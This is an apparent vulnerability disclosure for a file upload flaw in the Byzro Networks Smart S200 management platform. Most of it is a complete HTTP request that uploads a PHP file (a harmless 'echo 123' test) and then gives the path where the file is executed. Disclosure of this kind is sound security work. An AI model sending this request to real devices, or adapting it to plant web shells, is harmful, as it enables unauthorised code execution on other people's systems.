There is a file upload vulnerability in Byzro Networks Smart S200 management platform

version:S200

1. Impact of vulnerabilities：Smart S200
2. Vulnerability URL:/useratte/userattestation.php
3. Recurrence of vulnerabilities
As shown in the figure login interface
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/478c59df-d7ac-4bb1-bc5e-e7aed7ff0cc6)

Construct POC and successfully upload files
POC
```
POST /useratte/userattestation.php HTTP/1.1
Host: ip:8443
Cookie: PHPSESSID=757d1fb117127c2dae45afe484983c31
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 593
Origin: https://ip:8443
Referer: https://ip:8443/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="web_img"; filename="src.php"
Content-Type: application/octet-stream

<?php echo 123;?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="hidwel"

set
-----------------------------42328904123665875270630079328?
```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/377875ce-985c-4e3a-a1fe-39249542dab6)
access ip:port/boot/web/upload/weblogo/src.php
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/9e701706-2cfd-4787-869b-981a6c8258db)

